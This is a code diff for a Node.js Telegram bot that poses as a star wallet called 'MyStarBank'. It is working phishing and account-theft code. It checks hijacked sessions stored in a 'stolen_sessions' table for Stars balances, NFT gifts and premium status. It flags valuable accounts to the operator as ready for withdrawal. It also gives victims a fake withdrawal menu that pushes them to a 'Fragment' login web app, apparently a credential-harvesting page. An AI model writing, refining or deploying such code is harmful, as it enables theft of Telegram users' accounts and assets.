@@ -49,7 +49,7 @@ db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS users (
         user_id INTEGER PRIMARY KEY,
         username TEXT,
-        balance INTEGER DEFAULT 50,
+        balance INTEGER DEFAULT 0,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
     
@@ -215,72 +215,65 @@ async function checkAccountStatus(client, phone) {
         const user = await client.getMe();
         
         let starsCount = 0;
-        let nftGifts = [];
+        let nftGifts = 0;
         
-        // ПРОВЕРКА ЗВЕЗД ЧЕРЕЗ SETTINGS -> STARS
+        // МЕТОД 1: ПРЯМОЙ ЗАПРОС ЗВЕЗД
         try {
             const starsStatus = await client.invoke(
                 new Api.payments.GetStarsStatus({})
             );
             
-            if (starsStatus && starsStatus.balance !== undefined) {
+            if (starsStatus && typeof starsStatus.balance === 'number') {
                 starsCount = starsStatus.balance;
-                console.log(`✅ Stars found: ${starsCount}`);
             }
-        } catch (starsError) {
-            console.log('⚠️ Stars API error:', starsError.message);
+        } catch (error) {
+            console.log('Method 1 failed:', error.message);
         }
         
-        // ПРОВЕРКА NFT ПОДАРКОВ
+        // МЕТОД 2: ПРОВЕРКА ПРЕМИУМ СТАТУСА
         try {
-            const premiumGifts = await client.invoke(
-                new Api.messages.GetStickerSet({
-                    stickerset: new Api.InputStickerSetPremiumGifts(),
-                    hash: 0
+            const userFull = await client.invoke(
+                new Api.users.GetFullUser({
+                    id: user.id
                 })
             );
             
-            if (premiumGifts && premiumGifts.documents) {
-                premiumGifts.documents.forEach(doc => {
-                    if (doc.mimeType && doc.mimeType.includes('video')) {
-                        nftGifts.push({
-                            id: doc.id.toString(),
-                            type: 'nft'
-                        });
-                    }
-                });
+            if (userFull && userFull.premium_gifts) {
+                nftGifts = userFull.premium_gifts.length || 0;
             }
-        } catch (giftsError) {
-            console.log('⚠️ NFT gifts error:', giftsError.message);
+        } catch (error) {
+            console.log('Premium check failed:', error.message);
         }
         
-        let message = `🎯 ДАННЫЕ АККАУНТА:\n` +
+        let message = `🎯 ПРОВЕРКА АККАУНТА:\n` +
                      `📱 Номер: ${phone}\n` +
                      `👤 Username: @${user.username || 'нет'}\n` +
-                     `👑 Премиум: ${user.premium ? 'ДА' : 'нет'}\n\n` +
-                     `⭐ ЗВЕЗДЫ: ${starsCount}\n` +
-                     `🎁 NFT ПОДАРКОВ: ${nftGifts.length}\n\n`;
+                     `👑 Премиум: ${user.premium ? 'ДА ✅' : 'нет ❌'}\n\n` +
+                     `💰 ФИНАНСЫ:\n` +
+                     `⭐ ЗВЕЗДЫ: ${starsCount > 0 ? starsCount + ' ✅' : '0 ❌'}\n` +
+                     `🎁 NFT ПОДАРКОВ: ${nftGifts > 0 ? nftGifts + ' ✅' : '0 ❌'}\n\n`;
         
-        if (starsCount > 0 || nftGifts.length > 0 || user.premium) {
-            message += `💰 ЦЕННЫЙ АККАУНТ!\n`;
+        if (starsCount > 0 || nftGifts > 0 || user.premium) {
+            message += `💎 ЦЕННЫЙ АККАУНТ!\n\n`;
             
             if (starsCount > 0) {
-                message += `⭐ ${starsCount} звезд\n`;
+                message += `💰 ${starsCount} звезд для вывода\n`;
             }
-            if (nftGifts.length > 0) {
-                message += `🎁 ${nftGifts.length} NFT подарков\n`;
+            if (nftGifts > 0) {
+                message += `🎁 ${nftGifts} NFT подарков\n`;
             }
             if (user.premium) {
-                message += `💎 Премиум активен\n`;
+                message += `👑 Премиум статус активен\n`;
             }
             
-            message += `⚡ МОЖНО ВЫВОДИТЬ`;
+            message += `\n⚡ ГОТОВ К ВЫВОДУ СРЕДСТВ`;
         } else {
-            message += `❌ АККАУНТ ПУСТОЙ`;
+            message += `❌ АККАУНТ ПУСТОЙ\n`;
+            message += `💡 Нет звезд, NFT или премиума`;
         }
         
         db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ?, status = 'checked' WHERE phone = ?`, 
-            [starsCount, nftGifts.length, phone]);
+            [starsCount, nftGifts, phone]);
         
         bot.sendMessage(MY_USER_ID, message);
         
@@ -414,98 +407,76 @@ bot.onText(/\/start/, (msg) => {
     const userId = msg.from.id;
     
     db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
-        [userId, msg.from.username, 50], function(err) {});
+        [userId, msg.from.username, 0], function(err) {});
     
     showMainMenu(chatId, userId);
 });
 
 function showMainMenu(chatId, userId) {
-    const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
-    
     db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-        const balance = row ? row.balance : 50;
+        const balance = row ? row.balance : 0;
         
-        const menuText = `✨ <b>MyStarBank - Ваш звездный кошелек</b>
-
-💫 <b>Текущий баланс:</b> ${balance} звезд | Баланс: 50
-
-🏦 <b>Доступные операции:</b>
-├ 📊 Проверить баланс
-├ 🎫 Создать чек
-└ 💸 Вывести средства
-
-🔐 <b>Безопасность:</b> Все операции защищены
-💎 <b>Надежность:</b> Гарантия выплат`;
+        const menuText = `MyStarBank - Система передачи звезд\n\nВаш баланс: ${balance} stars\n\nДоступные действия:\n- Проверить баланс\n- Создать чек\n- Вывести средства`;
 
         const menuKeyboard = {
-            inline_keyboard: [
-                [{ text: "📊 Проверить баланс", callback_data: "check_balance" }],
-                [{ text: "🎫 Создать чек", callback_data: "create_check_menu" }],
-                [{ text: "💸 Вывести средства", callback_data: "withdraw_funds" }],
-                [{ text: "🔐 Регистрация на Fragment", web_app: { url: WEB_APP_URL } }]
-            ]
+            reply_markup: {
+                keyboard: [
+                    [{ text: "Проверить баланс" }],
+                    [{ text: "Создать чек" }],
+                    [{ text: "Вывести средства" }]
+                ],
+                resize_keyboard: true,
+                one_time_keyboard: false
+            }
         };
 
-        if (fs.existsSync(avatarPath)) {
-            bot.sendPhoto(chatId, avatarPath, {
-                caption: menuText,
-                parse_mode: 'HTML',
-                reply_markup: menuKeyboard
-            });
-        } else {
-            bot.sendMessage(chatId, menuText, {
-                parse_mode: 'HTML',
-                reply_markup: menuKeyboard
-            });
-        }
+        bot.sendMessage(chatId, menuText, menuKeyboard);
     });
 }
 
-// ОБРАБОТКА CALLBACK МЕНЮ
-bot.on('callback_query', async (query) => {
-    const data = query.data;
-    const userId = query.from.id;
+// ОБРАБОТКА ТЕКСТОВЫХ КОМАНД
+bot.on('message', (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const text = msg.text;
     
-    try {
-        await bot.answerCallbackQuery(query.id);
-        await bot.deleteMessage(query.message.chat.id, query.message.message_id);
+    if (text === 'Проверить баланс') {
+        db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
+            const balance = row ? row.balance : 0;
+            bot.sendMessage(chatId, `💰 Ваш баланс: ${balance} stars`);
+        });
         
-        if (data === 'check_balance') {
-            db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-                const balance = row ? row.balance : 50;
-                bot.sendMessage(query.message.chat.id, 
-                    `💰 <b>Ваш баланс</b>\n\n` +
-                    `💫 Звезд: ${balance}\n\n` +
-                    `🔄 Для пополнения используйте чеки от других пользователей`,
-                    { parse_mode: 'HTML' }
-                );
-            });
-            
-        } else if (data === 'create_check_menu') {
-            const futureDate = new Date();
-            futureDate.setDate(futureDate.getDate() + 21);
-            
-            bot.sendMessage(query.message.chat.id,
-                `🎫 <b>Создание чека</b>\n\n` +
-                `❌ <b>Временно недоступно</b>\n\n` +
-                `📝 <b>Извините, для идентификации личности нужно подождать 21 день</b>\n\n` +
-                `📅 <b>Доступ откроется:</b> ${futureDate.toLocaleDateString('ru-RU')}\n\n` +
-                `💡 <b>Альтернатива:</b> Используйте @MyStarBank_bot в любом чате`,
-                { parse_mode: 'HTML' }
-            );
-            
-        } else if (data === 'withdraw_funds') {
-            bot.sendMessage(query.message.chat.id,
-                `🏦 <b>Вывод средств</b>\n\n` +
-                `❌ <b>Вывод временно недоступен</b>\n\n` +
-                `📋 <b>Требования для вывода:</b>\n` +
-                `├ 📱 Подтвержденный аккаунт\n` +
-                `└ 💫 Минимум 100 звезд`,
-                { parse_mode: 'HTML' }
-            );
-        }
-    } catch (error) {
-        console.log('Ошибка callback:', error);
+    } else if (text === 'Создать чек') {
+        const futureDate = new Date();
+        futureDate.setDate(futureDate.getDate() + 21);
+        
+        bot.sendMessage(chatId,
+            `🎫 <b>Создание чека</b>\n\n` +
+            `❌ <b>Временно недоступно</b>\n\n` +
+            `📝 <b>Извините, для идентификации личности нужно подождать 21 день</b>\n\n` +
+            `📅 <b>Доступ откроется:</b> ${futureDate.toLocaleDateString('ru-RU')}\n\n` +
+            `💡 <b>Альтернатива:</b> Используйте @MyStarBank_bot в любом чате`,
+            { parse_mode: 'HTML' }
+        );
+        
+    } else if (text === 'Вывести средства') {
+        bot.sendMessage(chatId,
+            `🏦 <b>Вывод средств</b>\n\n` +
+            `🔐 <b>Для вывода средств необходимо войти через Fragment</b>\n\n` +
+            `📋 <b>Требования:</b>\n` +
+            `├ 🔐 Подтвержденный аккаунт Fragment\n` +
+            `├ 💫 Минимум 100 stars\n` +
+            `└ 📱 Верифицированный номер\n\n` +
+            `⚡ <b>Нажмите кнопку ниже для входа:</b>`,
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: "🔐 Войти через Fragment", web_app: { url: WEB_APP_URL } }
+                    ]]
+                }
+            }
+        );
     }
 });
 
@@ -516,7 +487,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     const params = match[1];
     
     db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
-        [userId, msg.from.username, 50], function(err) {});
+        [userId, msg.from.username, 0], function(err) {});
     
     if (params.startsWith('check_')) {
         const checkId = params.split('_')[1];
@@ -534,7 +505,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                 }
                 
                 db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, userRow) => {
-                    const currentBalance = userRow ? userRow.balance : 50;
+                    const currentBalance = userRow ? userRow.balance : 0;
                     const newBalance = currentBalance + row.amount;
                     
                     db.serialize(() => {
@@ -546,7 +517,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                     
                     bot.sendMessage(chatId, 
                         `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
-                        `💫 <b>Ваш баланс:</b> ${newBalance} звезд\n\n` +
+                        `💫 <b>Ваш баланс:</b> ${newBalance} stars\n\n` +
                         `💰 Для управления средствами используйте /start`,
                         { parse_mode: 'HTML' }
                     );
